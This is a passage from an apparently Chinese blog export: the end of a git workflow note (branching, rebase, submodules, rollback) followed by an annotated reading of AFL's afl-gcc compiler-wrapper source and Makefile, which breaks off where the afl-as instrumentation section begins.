<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 提交到本地</span></span><br><span class="line">git diff     <span class="comment"># 本地仓库和本地工作区文件的diff</span></span><br><span class="line">git add xxx</span><br><span class="line">git commit   <span class="comment"># 使用 vim 写 commit 信息 </span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>push 到仓库</li>
</ol>
<ul>
<li>经过这一步，仓库应该存在两个branch</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 分支同步：main 分支</span></span><br><span class="line">git checkout main</span><br><span class="line">git fetch origin</span><br><span class="line">git diff</span><br><span class="line">git pull origin main</span><br><span class="line">git checkout feature/windows</span><br><span class="line"></span><br><span class="line"><span class="comment"># rebase: 先合并main分支commit，在合并本地的commit</span></span><br><span class="line">git rebase main</span><br><span class="line">git push -f origin feature/windows</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>main 远程分支合并</li>
</ol>
<ul>
<li>在 github 类似的地方提交一个 <code>pr(pull request)</code>，将 <code>feature/windows</code> 合并到 <code>main</code> 分支里</li>
<li>经过项目开发者审查，会进行合并。</li>
<li>删除远端 <code>feature/windows</code> </li>
<li>删除本地分支</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout main</span><br><span class="line">git branch -D feature/windows</span><br><span class="line"><span class="comment"># 最后需要我们在进行合并一下</span></span><br><span class="line">git pull origin main</span><br></pre></td></tr></table></figure>

<p>因此创建三个分支来维护。</p>
<h2 id="子模块"><a href="#子模块" class="headerlink" title="子模块"></a>子模块</h2><ol>
<li>将子模块文件夹加入到 <code>.gitignore</code> 文件内容中，这样主项目就能够无视子项目的存在。</li>
<li>git submodule 使用</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将仓库clone下来，出现一个 .submodule 文件</span></span><br><span class="line">git submodule add https://github.com/chaconinc/DbConnector</span><br><span class="line"></span><br><span class="line">git submodule update --remote &lt;repo&gt;</span><br></pre></td></tr></table></figure>

<h2 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h2><p>最新的不一定是最好的，还可能是bug 多多的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -a  <span class="comment"># 先查看所有分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有的项目比较存在不同的tag</span></span><br><span class="line">git checkout &lt;branch&gt; &lt;tag&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有的项目存在版本 分支</span></span><br><span class="line">git checkout &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># commit 回退</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line">git checkout &lt;comit_hash&gt;</span><br></pre></td></tr></table></figure>


<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote <span class="built_in">rm</span> -r --cached &lt;<span class="built_in">dir</span>/filename&gt;</span><br><span class="line">git commit -m <span class="string">&quot;delete&quot;</span></span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure>

<p>但是现在比较好的IDE只需要点击一下鼠标就行，也是很方便。</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>afl-gcc</title>
    <url>/2024/03/09/afl-gcc/</url>
    <content><![CDATA[<blockquote>
<p>模糊测试插桩</p>
</blockquote>
<span id="more"></span>

<p><strong>想要阅读的更清楚，可以手动编译afl然后使用gdb调试，更清晰的了解每一步的结果</strong></p>
<h1 id="afl-gcc-as"><a href="#afl-gcc-as" class="headerlink" title="afl gcc &amp;&amp; as"></a>afl gcc &amp;&amp; as</h1><blockquote>
<p>如何进行静态插桩</p>
</blockquote>
<p>afl-gcc 是 gcc, g++, clang, clang++ 的包装器。它的作用是设置一些编译参数，然后调用这些编译器。事实上，编译出来的 afl-clang, afl-g++ 等文件都是指向 afl-gcc 的软链接。</p>
<p>afl-gcc 需要知道 afl-as 的路径。afl-as 是插桩器，我们将会在后文分析它的逻辑。可以通过 AFL_PATH 指定。</p>
<h2 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>afl-gcc 的入口点</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// isatty: 普通文件返回0，设备返回-1</span></span><br><span class="line">  <span class="comment">// 2: stderr  标准错误设备  </span></span><br><span class="line">  <span class="comment">// 环境变量：如果不是 QUIET 模式，则输出afl信息</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isatty</span>(<span class="number">2</span>) &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断用法，没有参数</span></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 寻找 afl-as 路径</span></span><br><span class="line">  <span class="built_in">find_as</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置afl-gcc参数</span></span><br><span class="line">  <span class="built_in">edit_params</span>(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// execvp: 程序立即被实际命令替换。</span></span><br><span class="line">  <span class="comment">// 我们的程序已被完全接管，因此execvp()之后的所有内容均将execvp()执行！</span></span><br><span class="line">  <span class="built_in">execvp</span>(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h3><p>寻找 afl-as 路径</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// argv0 是程序名，afl-gcc</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">find_as</span><span class="params">(u8* argv0)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 环境变量寻找到 AFL_PATH</span></span><br><span class="line">  u8 *afl_path = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PATH&quot;</span>);</span><br><span class="line">  u8 *slash, *tmp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果环境存在AFL_PATH 则在目录指定的path寻找</span></span><br><span class="line">  <span class="keyword">if</span> (afl_path) &#123;</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/as&quot;</span>, afl_path);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// access：判断as是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = afl_path;</span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 寻找到最后一个 &#x27;/&#x27;</span></span><br><span class="line">  <span class="comment">// /usr/bin/afl-gcc =&gt; /afl-gcc</span></span><br><span class="line">  slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (slash) &#123;</span><br><span class="line"></span><br><span class="line">    u8 *dir;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里比较奇妙</span></span><br><span class="line">    <span class="comment">// /usr/bin/afl-gcc =&gt; /usr/bin\0afl-gcc</span></span><br><span class="line">    <span class="comment">// strdup 就获得了 dir = /usr/bin</span></span><br><span class="line">    *slash = <span class="number">0</span>;</span><br><span class="line">    dir = <span class="built_in">ck_strdup</span>(argv0);</span><br><span class="line">    *slash = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-as&quot;</span>, dir);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = dir;</span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">    <span class="built_in">ck_free</span>(dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fallback，如果前两个位置都找不到，则去编译 afl-gcc 时定义的 AFL_PATH 去找</span></span><br><span class="line">  <span class="comment">// AFL_PATH 由 Makefile 定义成 &quot;/usr/local/lib/afl&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;</span><br><span class="line">    as_path = AFL_PATH;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Makefile中，使用<code>gcc -D</code>指定环境变量</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">PREFIX     ?= /usr/local</span><br><span class="line">BIN_PATH    = <span class="variable">$(PREFIX)</span>/bin</span><br><span class="line">HELPER_PATH = <span class="variable">$(PREFIX)</span>/lib/afl</span><br><span class="line">DOC_PATH    = <span class="variable">$(PREFIX)</span>/share/doc/afl</span><br><span class="line">MISC_PATH   = <span class="variable">$(PREFIX)</span>/share/afl</span><br><span class="line"></span><br><span class="line"><span class="comment"># PROGS intentionally omit afl-as, which gets installed elsewhere.</span></span><br><span class="line"></span><br><span class="line">PROGS       = afl-gcc afl-fuzz afl-showmap afl-tmin afl-gotcpu afl-analyze</span><br><span class="line">SH_PROGS    = afl-plot afl-cmin afl-whatsup</span><br><span class="line"></span><br><span class="line">CFLAGS     ?= -O3 -funroll-loops</span><br><span class="line">CFLAGS     += -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign \</span><br><span class="line">	      -DAFL_PATH=\<span class="string">&quot;<span class="variable">$(HELPER_PATH)\&quot;</span> -DDOC_PATH=\&quot;<span class="variable">$(DOC_PATH)\&quot;</span> \</span></span><br><span class="line"><span class="string">	      -DBIN_PATH=\&quot;<span class="variable">$(BIN_PATH)\&quot;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="edit-param"><a href="#edit-param" class="headerlink" title="edit_param"></a>edit_param</h3><p>编译器参数设置，忽略掉 <code>__APPLE__</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Copy argv to cc_params, making the necessary edits. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edit_params</span><span class="params">(u32 argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 fortify_set = <span class="number">0</span>, asan_set = <span class="number">0</span>;</span><br><span class="line">  u8 *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">  u8 m32_set = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  cc_params = <span class="built_in">ck_alloc</span>((argc + <span class="number">128</span>) * <span class="built_in">sizeof</span>(u8*));</span><br><span class="line"></span><br><span class="line">  name = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!name) name = argv[<span class="number">0</span>]; <span class="keyword">else</span> name++;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 首先将设置指定的编译器</span></span><br><span class="line">  <span class="comment">// 如果是afl-clang，设置编译器为 clang</span></span><br><span class="line">  <span class="comment">// alf-clang++同理</span></span><br><span class="line">  <span class="comment">// more: afl-clang-fast在 llvm mode 处理</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;afl-clang&quot;</span>, <span class="number">9</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    clang_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(CLANG_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-clang++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;clang++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;clang&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;    <span class="comment">// else 就是 afl-gcc</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* With GCJ and Eclipse installed, you can actually compile Java! The</span></span><br><span class="line"><span class="comment">       instrumentation will work (amazingly). Alas, unhandled exceptions do</span></span><br><span class="line"><span class="comment">       not call abort(), so afl-fuzz would need to be modified to equate</span></span><br><span class="line"><span class="comment">       non-zero exit codes with crash conditions when working with Java</span></span><br><span class="line"><span class="comment">       binaries. Meh. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!cc_params[<span class="number">0</span>]) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang. Please use the\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    &#x27;afl-clang&#x27; utility instead of &#x27;afl-gcc&#x27;. If you really have GCC installed,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    set AFL_CC or AFL_CXX to specify the correct path to that compiler.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;g++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcj&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第二个参数，设置一些编译器参数</span></span><br><span class="line">  <span class="keyword">while</span> (--argc) &#123;</span><br><span class="line">    u8* cur = *(++argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cur, <span class="string">&quot;-B&quot;</span>, <span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!be_quiet) <span class="built_in">WARNF</span>(<span class="string">&quot;-B is already set, overriding&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!cur[<span class="number">2</span>] &amp;&amp; argc &gt; <span class="number">1</span>) &#123; argc--; argv++; &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-integrated-as&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-pipe&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) m32_set = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) ||</span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = cur;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// -B ，指定汇编器的目录，会被覆盖为 as_path</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-B&quot;</span>;</span><br><span class="line">  cc_params[cc_par_cnt++] = as_path;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clang mode 的一些flag</span></span><br><span class="line">  <span class="keyword">if</span> (clang_mode)</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-no-integrated-as&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// AFL_HARDEN 开启栈保护，更容易发现栈溢出问题</span></span><br><span class="line">  <span class="comment">// 开启stack canary</span></span><br><span class="line">  <span class="comment">// 检测固定的函数</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fstack-protector-all&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fortify_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-D_FORTIFY_SOURCE=2&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检测内存问题</span></span><br><span class="line">  <span class="comment">// ASan 是用来检测 释放后使用(use-after-free)、多次释放(double-free)</span></span><br><span class="line">  <span class="comment">// 缓冲区溢出(buffer overflows)和下溢(underflows) 的内存问题。</span></span><br><span class="line">  <span class="keyword">if</span> (asan_set) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pass this on to afl-as to adjust map density. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;MSAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=memory&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// AFL_DONT_OPTIMIZE：编译器优化开关</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* On 64-bit FreeBSD systems, clang -g -m32 is broken, but -m32 itself</span></span><br><span class="line"><span class="comment">       works OK. This has nothing to do with us, but let&#x27;s avoid triggering</span></span><br><span class="line"><span class="comment">       that bug. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!clang_mode || !m32_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Two indicators that you&#x27;re building for fuzzing; one of them is</span></span><br><span class="line"><span class="comment">       AFL-specific, the other is shared with libfuzzer. */</span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 不使用某些内置函数</span></span><br><span class="line">  <span class="comment">// 比如编写某些操作系统时就不使用内置函数</span></span><br><span class="line">  <span class="comment">// -fno-builtin</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strstr&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasestr&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置完参数后，gcc开始编译。一个c文件到可执行文件分为 <code>预处理，编译，汇编，链接</code>阶段</p>
<h2 id="afl-as-静态插桩"><a href="#afl-as-静态插桩" class="headerlink" title="afl-as 静态插桩"></a>afl-as 静态插桩</h2><p>-B 的含义： Add &lt;directory&gt; to the compiler’s search paths，也就是在此目录下寻找汇编器</p>
<p>C语言编译</p>
